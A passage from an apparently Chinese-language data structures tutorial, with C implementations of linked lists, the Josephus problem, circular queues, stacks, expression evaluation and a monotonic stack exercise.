&#125;&#125;int main() &#123; LinkedList linkedlist = NULL; for (int i = 1; i &lt;= 10; i++) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = i; node-&gt;next = NULL; linkedlist = insert(linkedlist, node, i - 1); &#125; output(linkedlist); linkedlist = delete_node(linkedlist, 9); output(linkedlist); linkedlist = reverse(linkedlist); output(linkedlist); clear(linkedlist); return 0;&#125; 循环链表约瑟夫环 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node&#123; int data; struct Node *next;&#125;Node, *LinkedList;LinkedList insert(LinkedList head, Node *node, int index) &#123; if (head == NULL) &#123; if (index != 0) &#123; return head; &#125; head = node; head-&gt;next = head; return head; &#125; if (index == 0) &#123; node-&gt;next = head-&gt;next; // 循环 head-&gt;next = node; return head; &#125; Node *current_node = head-&gt;next; // head为标记的尾节点 int count = 0; while (current_node != head &amp;&amp; count &lt; index - 1) &#123; current_node = current_node-&gt;next; count++; &#125; if (count == index - 1) &#123; node-&gt;next = current_node-&gt;next; current_node-&gt;next = node; &#125; // 此时更新尾节点 if (node == head-&gt;next) &#123; head = node; &#125; return head;&#125;// 约瑟夫环void output_josephus(LinkedList head, int m) &#123; Node *current_node = head; head = NULL; while (current_node-&gt;next != current_node) &#123; for (int i = 1; i &lt; m; i++) &#123; current_node = current_node-&gt;next; &#125; printf(\"%d \", current_node-&gt;next-&gt;data); Node *delete_node = current_node-&gt;next; current_node-&gt;next = current_node-&gt;next-&gt;next; free(delete_node); &#125; printf(\"%d\\n\", current_node-&gt;data); free(current_node);&#125;int main() &#123; LinkedList linkedlist = NULL; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); for (int i = 1; i &lt;= n; i++) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = i; node-&gt;next = NULL; linkedlist = insert(linkedlist, node, i - 1); &#125; output_josephus(linkedlist, m); return 0;&#125; 循环链表需要记录的是尾结点的位置。那么插入节点就不会循环一圈，才能找到尾结点。 增加 dummy node 的解法 单向 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next;&#125; Node;typedef struct List&#123; // Node *head; 改为 dummy node, 而不再是一个指针 Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// 插入输入节点int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; l-&gt;len++; return 1;&#125;// 插入输入值int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// 删除int erase(List *l, int idx) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt;= l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; Node *tmp = prev-&gt;next; prev-&gt;next = tmp-&gt;next; freeNode(tmp); l-&gt;len--; return 1;&#125;int search(List *l, int idx) &#123; if (!l) return -1; if (idx &lt; 0 | idx &gt;= l-&gt;len) return -1; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; return prev-&gt;next-&gt;val;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *tmp = &amp;(l-&gt;head); printf(\"List+: [\"); while (p) &#123; tmp = p; printf(\"%d-&gt;\", p-&gt;val); p = p-&gt;next; &#125; printf(\"NULL]\\n\"); return;&#125; 增加 dummy node 的解法 双向 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next; struct Node *prev;&#125; Node;typedef struct List&#123; // Node *head; 改为 dummy node, 而不再是一个指针 Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; n-&gt;prev = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;head.prev = NULL; // not necessarily l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// 插入输入节点int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; n-&gt;prev = prev; if (n-&gt;next) n-&gt;next-&gt;prev = n; l-&gt;len++; return 1;&#125;// 插入输入值int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// 删除int erase(List *l, int idx) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt;= l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; Node *tmp = prev-&gt;next; prev-&gt;next = tmp-&gt;next; if (tmp-&gt;next) tmp-&gt;next-&gt;prev = prev; freeNode(tmp); l-&gt;len--; return 1;&#125;int reverse(List *l) &#123; if (!l || l-&gt;len == 0) return 0; Node *p = l-&gt;head.next; Node *cur = NULL; l-&gt;head.next = NULL; l-&gt;len = 0; while (p) &#123; cur = p; p = p-&gt;next; insertNode(l, 0, cur); &#125; return 1;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *tmp = &amp;(l-&gt;head); int len = l-&gt;len; // printf(\"List+: [\"); // while (len--) &#123; // tmp = p; // printf(\"%d-&gt;\", p-&gt;val); // p = p-&gt;next; // &#125; // printf(\"NULL]\\n\"); // printf(\"List-: [\"); // len = l-&gt;len; // while (len--) &#123; // printf(\"%d-&gt;\", tmp-&gt;val); // tmp = tmp-&gt;prev; // &#125; // printf(\"HEAD]\\n\"); printf(\"List+: [\"); while (p) &#123; tmp = p; printf(\"%d-&gt;\", p-&gt;val); p = p-&gt;next; &#125; printf(\"NULL]\\n\"); printf(\"List-: [\"); while (tmp != &amp;(l-&gt;head)) &#123; printf(\"%d-&gt;\", tmp-&gt;val); tmp = tmp-&gt;prev; &#125; printf(\"HEAD]\\n\"); return;&#125;int main(int argc, char **argv) &#123; srand(time(NULL)); int cnt = 20; List *l = initList(); while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 5; int idx = rand() % (l-&gt;len + 3) - 1; switch (opt) &#123; case 0: case 1: case 2: printf(\"insert %d at %d, res = %s\\n\", val, idx, insertValue(l, idx, val) ? \"SUCCESS\" : \"FAILED\"); break; case 3: printf(\"erease at %d, res = %s\\n\", idx, erase(l, idx) ? \"SUCCESS\" : \"FAILED\"); break; case 4: printf(\"reverse, res = %s\\n\", reverse(l) ? \"SUCCESS\" : \"FAILED\"); break; &#125; showList(l); printf(\"\\n\"); &#125; return 0;&#125; 练习 LeetCode 剑指offer： 24 35 18 06 25 22 36 52 顺序表循环左移 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ERROR 0#define OK 1typedef struct Vector &#123; int size, len; int *data;&#125; Vec;void initVec(Vec *v, int size) &#123; if (!v) return; v-&gt;size = size; v-&gt;len = 0; v-&gt;data = (int *)malloc(sizeof(int) * size); return;&#125;int expand(Vec *v) &#123; int asize = v-&gt;size; int *tmp = NULL; while (asize) &#123; tmp = (int *)realloc(v-&gt;data, sizeof(int) * (asize + v-&gt;size)); if (tmp) break; asize &gt;&gt;= 2; &#125; if (tmp == NULL) return ERROR; v-&gt;data = tmp; v-&gt;size += asize; return OK;&#125;int insert(Vec *v, int idx, int val) &#123; if (!v) return ERROR; if (idx &lt; 0 | idx &gt; v-&gt;len) return ERROR; if (v-&gt;size == v-&gt;len) if (!expand(v)) return ERROR; memcpy(v-&gt;data + idx + 1, v-&gt;data + idx, sizeof(int) * (v-&gt;len - idx)); v-&gt;data[idx] = val; v-&gt;len++; return OK;&#125;void freeVec(Vec *v) &#123; if (!v) return; free(v-&gt;data); free(v);&#125;// moveint moveBlock(Vec *v, int num) &#123; if (!v) return ERROR; if (num &lt; 0 | num &gt; v-&gt;len) return ERROR; int *tmp = (int *)malloc(num * sizeof(int)); memcpy(tmp, v-&gt;data, sizeof(int) * num); memcpy(v-&gt;data, v-&gt;data + num, sizeof(int) * (v-&gt;len - num)); memcpy(v-&gt;data + (v-&gt;len - num), tmp, sizeof(int) * num); return OK;&#125;void printVec(Vec *v) &#123; if (!v) return; for (int i = 0; i &lt; v-&gt;len; i++) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d\", *(v-&gt;data + i)); &#125; return;&#125;int main() &#123; Vec *v = (Vec *)malloc(sizeof(Vec)); (void)initVec(v, 10); int n, k, val; scanf(\"%d%d\", &amp;n, &amp;k); for (int i=0; i&lt;n; i++) &#123; scanf(\"%d\", &amp;val); if (!insert(v, i, val)) return 3; &#125; if (!moveBlock(v, k)) return 4; (void)printVec(v); (void)freeVec(v); return 0;&#125; reverse chars 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next;&#125; Node;typedef struct List&#123; // Node *head; 改为 dummy node, 而不再是一个指针 Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// 插入输入节点int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; l-&gt;len++; return 1;&#125;// 插入输入值int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// 实现reverseint reverse(List *l) &#123; if (!l) return 0; Node *cur = l-&gt;head.next; Node *tmp = NULL; l-&gt;head.next = NULL; l-&gt;len = 0; while (cur) &#123; tmp = cur; cur = cur-&gt;next; tmp-&gt;next = l-&gt;head.next; l-&gt;head.next = tmp; l-&gt;len++; &#125; return 1;&#125;int search(List *l, int idx) &#123; if (!l) return -1; if (idx &lt; 0 | idx &gt;= l-&gt;len) return -1; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; return prev-&gt;next-&gt;val;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; while (p) &#123; printf(\"%c\", p-&gt;val); p = p-&gt;next; (p != NULL) &amp;&amp; printf(\" \"); &#125; return;&#125;int main() &#123; int n; char c; scanf(\"%d\", &amp;n); List *l = initList(); getchar(); for (int i=0; i&lt;n * 2 - 1; i++) &#123; scanf(\"%c\", &amp;c); if (c &gt; 40) &#123; if (!insertValue(l, i / 2, c)) return 1; &#125; &#125; if (!reverse(l)) return 2; (void)showList(l); freeList(l); return 0;&#125; 双向循环 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next; struct Node *prev;&#125; Node;typedef struct List&#123; // Node *head; 改为 dummy node, 而不再是一个指针 Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; n-&gt;prev = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;head.prev = NULL; // not necessarily l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; int len = l-&gt;len; while (len) &#123; // 更改为按长度free del_ = p; p = p-&gt;next; free(del_); len--; &#125; free(l); return;&#125;// 插入输入节点: 更改为循环链表int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; if (l-&gt;len == 0) &#123; l-&gt;head.next = n; n-&gt;prev = n; n-&gt;next = n; l-&gt;len++; return 1; &#125; Node *prev = l-&gt;head.next; while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; n-&gt;prev = prev; if (n-&gt;next) n-&gt;next-&gt;prev = n; if (n == l-&gt;head.next-&gt;next) &#123; l-&gt;head.next = n; &#125; l-&gt;len++; return 1;&#125;// 插入输入值int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// 更改为循环链表 从 k 位置反向输出void showList(List *l, int k) &#123; if (!l) return; Node *p = l-&gt;head.next; int c = l-&gt;len; while (p-&gt;val != k &amp;&amp; c) &#123; p = p-&gt;next; c--; &#125; if (c == 0 &amp;&amp; p-&gt;val != k) return; Node *tmp = p; int len = l-&gt;len; while (tmp != p-&gt;next) &#123; printf(\"%d \", tmp-&gt;val); tmp = tmp-&gt;prev; &#125; printf(\"%d\", p-&gt;next-&gt;val); return;&#125;int main(int argc, char **argv) &#123; int n, val; scanf(\"%d\", &amp;n); List *l = initList(); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); insertValue(l, i, val); &#125; int k; scanf(\"%d\", &amp;k); showList(l, k); freeList(l); return 0;&#125; 队列 队列有一个很重要的性质，就是 先进先出 ，First In First Out(FIFO)。 利用两个变量head和tail维护队列的进出。 简单实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Queue&#123; int *data; int head, tail, length;&#125;Queue;void init(Queue *q, int length) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length); q-&gt;head = 0; q-&gt;tail = -1; q-&gt;length = length;&#125;int push(Queue *q, int element) &#123; if (q-&gt;tail + 1 &gt;= q-&gt;length) return 0; q-&gt;data[++q-&gt;tail] = element; return 1; &#125;void output(Queue *q) &#123; for (int i = q-&gt;head; i &lt;= q-&gt;tail; ++i) &#123; (i != q-&gt;head) &amp;&amp; printf(\" \"); printf(\"%d\", q-&gt;data[i]); &#125;&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head++;&#125;int empty(Queue *q) &#123; return q-&gt;head &gt; q-&gt;tail;&#125;void clear(Queue *q) &#123; free(q-&gt;data); free(q);&#125;int main() &#123; Queue *queue = (Queue *)malloc(sizeof(Queue)); init(queue, 100); int n, val; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); if (!push(queue, val)) return 1; &#125; if (!empty(queue)) &#123; int k; scanf(\"%d\", &amp;k); while (k--) &#123; pop(queue); &#125; &#125; if (!empty(queue)) &#123; printf(\"%d\\n\", front(queue)); output(queue); &#125; else &#123; printf(\"0\"); &#125; clear(queue); return 0;&#125; 循环队列 在循环队列里，不能单纯通过比较 tail 和 head 标记来判断循环队列是否已满，否则在初始化状态就会被认为循环队列已满。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Queue &#123; int *data; int head, tail, length, count;&#125;Queue;void init(Queue *q, int length) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length); q-&gt;length = length; q-&gt;head = 0; q-&gt;tail = -1; q-&gt;count = 0;&#125;// 扩容需要考虑循环结构int expand(Queue *q) &#123; if (!q) return ERROR; int expsize = q-&gt;length; int *tmp = NULL; while (expsize &gt; 0) &#123; // 因为要重新组织数据，所以不用realloc了 tmp = (int *)malloc(sizeof(int) * (q-&gt;length + expsize)); if (tmp) break; expsize &gt;&gt;= 1; &#125; if (!tmp) return ERROR; // 复制到新空间中 int i, j; int end = (q-&gt;tail + 1) % q-&gt;length; for (i = q-&gt;head, j = 0; i != end; i = (i + 1) % q-&gt;length, j++) &#123; tmp[j] = q-&gt;data[i]; &#125; free(q-&gt;data); q-&gt;data = tmp; q-&gt;length += expsize; q-&gt;head = 0; q-&gt;tail = j - 1; return OK;&#125;int push(Queue *q, int element) &#123; if (q-&gt;count &gt;= q-&gt;length) &#123; if (!expand(q)) return ERROR; &#125; q-&gt;tail = (q-&gt;tail + 1) % q-&gt;length; // 环 取余 q-&gt;data[q-&gt;tail] = element; q-&gt;count++; return OK;&#125;void output(Queue *q) &#123; int i = q-&gt;head; // 从 head 到 tail do &#123; printf(\"%d \", q-&gt;data[i]); i = (i + 1) % q-&gt;length; &#125; while(i != (q-&gt;tail + 1) % q-&gt;length); printf(\"\\n\");&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head = (q-&gt;head + 1) % q-&gt;length; // 环 取余 q-&gt;count--;&#125;int empty(Queue *q) &#123; return q-&gt;count == 0;&#125;void clear(Queue *q) &#123; free(q-&gt;data); free(q);&#125;int main() &#123; Queue *q = (Queue *)malloc(sizeof(Queue)); init(q, 100); for (int i = 1; i &lt;= 10; i++) &#123; push(q, i); &#125; output(q); if (!empty(q)) &#123; printf(\"%d\\n\", front(q)); pop(q); &#125; output(q); clear(q); return 0;&#125; 链表实现队列 链表使用了一个dummy node. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;time.h&gt;#define ERROR 0;#define OK 1;typedef struct Node &#123; int val; struct Node *next;&#125; Node, *Node_p;// 设计为带有dummy head的链表typedef struct Queue &#123; Node *head; Node *tail; int len;&#125; Queue, *Queue_p;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;Queue *initStack() &#123; Queue_p q = (Queue_p)malloc(sizeof(Queue)); q-&gt;head = initNode(-1); q-&gt;tail = NULL; q-&gt;len = 0; return q;&#125;int push(Queue_p q, int val) &#123; if (!q) return ERROR; Node_p node = initNode(val); // 有tail就在tail之后增加 if (q-&gt;tail) &#123; q-&gt;tail-&gt;next = node; q-&gt;tail = node; &#125; else &#123; node-&gt;next = q-&gt;head-&gt;next; q-&gt;head-&gt;next = node; q-&gt;tail = node; &#125; q-&gt;len++; return OK;&#125;void freeNode(Node_p n) &#123; if (n) free(n);&#125;int pop(Queue_p q) &#123; if (!q || !q-&gt;head || !q-&gt;head-&gt;next) return ERROR; Node_p tmp = q-&gt;head-&gt;next; q-&gt;head-&gt;next = q-&gt;head-&gt;next-&gt;next; freeNode(tmp); // 最后一个节点被弹出 if (q-&gt;head-&gt;next == NULL) q-&gt;tail = NULL; q-&gt;len--; return OK;&#125;int top(Queue_p q) &#123; if (!q || !q-&gt;head || !q-&gt;head-&gt;next) return ERROR; return q-&gt;head-&gt;next-&gt;val;&#125;int empty(Queue_p q) &#123; return (!q || !q-&gt;head || !q-&gt;head-&gt;next);&#125;void freeStack(Queue_p q) &#123; if (!q || !q-&gt;head) return; Node *p = q-&gt;head, *tmp; while (p) &#123; tmp = p; p = p-&gt;next; freeNode(tmp); &#125; free(q);&#125;void showStack(Queue_p q) &#123; if (!q || !q-&gt;head) return; Node_p p = q-&gt;head-&gt;next; while (p) &#123; (p != q-&gt;head-&gt;next) &amp;&amp; printf(\" \"); printf(\"%d\", p-&gt;val); p = p-&gt;next; &#125; printf(\"\\n\");&#125;int main() &#123; srand(time(NULL)); Queue_p q = initStack(); int cnt = 20; while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 4; switch (opt) &#123; case 0: case 1: case 2: printf(\"push %d, %s\\n\", val, push(q, val) ? \"SUC\": \"ERROR\"); showStack(q); break; case 3: empty(q) ? printf(\"Nothing to pop.\\n\") : printf(\"Pop.\\n\"); pop(q); showStack(q); break; &#125; &#125; printf(\"\\nFinal: \\n\"); showStack(q); return 0;&#125; 栈 栈有一个重要的性质，就是 先进后出 ，First In Last Out(FILO)。例如，浏览器页面的多次跳转和多次返会功能，就是栈的应用。 利用一个变量维护栈顶位置。 栈，通过实现一个表达式解析问题，进行实现。 用栈实现表达式求值的算法流程如下： 使用两个栈分别存储数值和运算符。 读取表达式字符，数值存入数值栈，运算符和栈顶运算符比较优先级。 通过运算符优先级不同选择将它压入栈或取出数值栈中两个元素进行计算，计算结果入栈。 返回步骤 2，直至表达式全部读完。 弹出一个运算符和两个数值进行运算，计算结果存储数值栈。 当运算符栈不为空时，返回步骤 5，否则数值栈中剩余的最后一个元素就是表达式求值结果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#define ERROR 0#define OK 1typedef struct Stack &#123; int *elements; int max_size, top_index;&#125; Stack;void init(Stack *s, int length) &#123; s-&gt;elements = (int *)malloc(sizeof(int) * length); s-&gt;max_size = length; s-&gt;top_index = -1;&#125;int expand(Stack *s) &#123; if (!s) return ERROR; int expsize = s-&gt;max_size; int *tmp; while (expsize &gt; 0) &#123; tmp = (int *)realloc(s-&gt;elements, sizeof(int) * (s-&gt;max_size + expsize)); if (tmp) break; expsize &gt;&gt;= 1; &#125; if (!tmp) return ERROR; s-&gt;elements = tmp; s-&gt;max_size += expsize; return OK;&#125;int push(Stack *s, int element) &#123; if (s-&gt;top_index &gt;= s-&gt;max_size - 1) &#123; if (!expand(s)) return ERROR; &#125; s-&gt;top_index++; s-&gt;elements[s-&gt;top_index] = element; return OK;&#125;int pop(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return ERROR; &#125; s-&gt;top_index--; return OK;&#125;int top(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index];&#125;int empty(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;// 优先级判断int precede(char a, char b) &#123; if ((a == '*'||a=='/') &amp;&amp; (b == '+'||b == '-')) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;// 计算 a theta bint operate(char theta, int a, int b) &#123; if (theta == '+') &#123; return a + b; &#125; else if (theta == '*')&#123; return a * b; &#125; else if (theta == '-')&#123; return a - b; &#125; else if (theta == '/')&#123; return a / b; &#125;&#125;// 计算表达式void calc(Stack *numbers, Stack *operators) &#123; int a = top(numbers); pop(numbers); int b = top(numbers); pop(numbers); push(numbers, operate(top(operators), b, a)); pop(operators);&#125;void clear(Stack *s) &#123; free(s-&gt;elements); free(s);&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); Stack *numbers = (Stack *)malloc(sizeof(Stack)); init(numbers, n); Stack *operators = (Stack *)malloc(sizeof(Stack)); init(operators, n); char *buffer = (char *)malloc(sizeof(char) * (n + 1)); scanf(\"%s\", buffer); int i = 0; while (i &lt; n) &#123; if (isdigit(buffer[i])) &#123; push(numbers, buffer[i] - '0'); i++; &#125; else &#123; if (empty(operators) || precede(buffer[i], top(operators))) &#123; push(operators, buffer[i]); i++; &#125; else &#123; calc(numbers, operators); &#125; &#125; &#125; while (!empty(operators)) &#123; calc(numbers, operators); &#125; printf(\"%d\\n\", top(numbers)); clear(numbers); clear(operators); free(buffer); return 0;&#125; 单调栈 地上从左到右竖立着 n 块木板，从 1 到 n 依次编号，如下图所示。我们知道每块木板的高度，在第 n 块木板右侧竖立着一块高度无限大的木板，现对每块木板依次做如下的操作：对于第 i 块木板，我们从其右侧开始倒水，直到水的高度等于第 i 块木板的高度，倒入的水会淹没 \\(a_i\\) 块木板（如果木板左右两侧水的高度大于等于木板高度即视为木板被淹没）。求 n 次操作后，所有 \\(a_i\\) 的和是多少。 如图所示，在第 4 块木板右侧倒水，可以淹没第 5 块和第 6 块一共 2 块木板，\\(a_4\\) = 2。 建立一个从栈顶到栈底递增的单调栈。假设木板p是栈顶元素，木板q是当前待入栈元素。 将q push 到栈的过程中，如果栈顶元素p出栈则表明我们已经找到了木板p右侧第一块比它高的木板q。 然后只需要记录q与p之间的木板数，求和。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Node &#123; int id, height;&#125; Node;typedef struct Stack &#123; Node *elements; int max_size, top_index;&#125; Stack;void init(Stack *s, int length) &#123; s-&gt;elements = (Node *)malloc(sizeof(Node) * length); s-&gt;max_size = length; s-&gt;top_index = -1;&#125;int push(Stack *s, Node element) &#123; if (s-&gt;top_index &gt;= s-&gt;max_size - 1) &#123; return ERROR; &#125; s-&gt;top_index++; s-&gt;elements[s-&gt;top_index] = element; return OK;&#125;int pop(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return ERROR; &#125; s-&gt;top_index--; return OK;&#125;Node top(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index];&#125;int empty(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;void clear(Stack *s) &#123; free(s-&gt;elements); free(s);&#125;int main() &#123; int n, ans = 0; scanf(\"%d\", &amp;n); Stack *stack = (Stack *)malloc(sizeof(Stack)); init(stack, n); Node temp; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;temp.height); temp.id = i; while (!empty(stack) &amp;&amp; top(stack).height &lt;= temp.height) &#123; ans = ans + i - top(stack).id - 1; pop(stack); &#125; push(stack, temp); &#125; while (!empty(stack)) &#123; ans = ans + n + 1 - top(stack).id - 1; pop(stack); &#125; printf(\"%d\\n\", ans); clear(stack); return 0;&#125; 链表实现栈 使用一个带有dummy node的链表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;time.h&gt;#define ERROR 0;#define OK 1;typedef struct Node &#123; int val; struct Node *next;&#125; Node, *Node_p;// 设计为带有dummy head的链表typedef struct Stack &#123; Node *head; int len;&#125; Stack, *Stack_p;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;Stack *initStack() &#123; Stack_p s = (Stack_p)malloc(sizeof(Stack)); s-&gt;head = initNode(-1); s-&gt;len = 0; return s;&#125;int push(Stack_p s, int val) &#123; if (!s) return ERROR; Node_p node = initNode(val); node-&gt;next = s-&gt;head-&gt;next; s-&gt;head-&gt;next = node; s-&gt;len++; return OK;&#125;void freeNode(Node_p n) &#123; if (n) free(n);&#125;int pop(Stack_p s) &#123; if (!s || !s-&gt;head || !s-&gt;head-&gt;next) return ERROR; Node_p tmp = s-&gt;head-&gt;next; s-&gt;head-&gt;next = s-&gt;head-&gt;next-&gt;next; freeNode(tmp); s-&gt;len--; return OK;&#125;int top(Stack_p s) &#123; if (!s || !s-&gt;head || !s-&gt;head-&gt;next) return ERROR; return s-&gt;head-&gt;next-&gt;val;&#125;int empty(Stack_p s) &#123; return (!s || !s-&gt;head || !s-&gt;head-&gt;next);&#125;void freeStack(Stack_p s) &#123; if (!s || !s-&gt;head) return; Node *p = s-&gt;head, *tmp; while (p) &#123; tmp = p; p = p-&gt;next; freeNode(tmp); &#125; free(s);&#125;void showStack(Stack_p s) &#123; if (!s || !s-&gt;head) return; 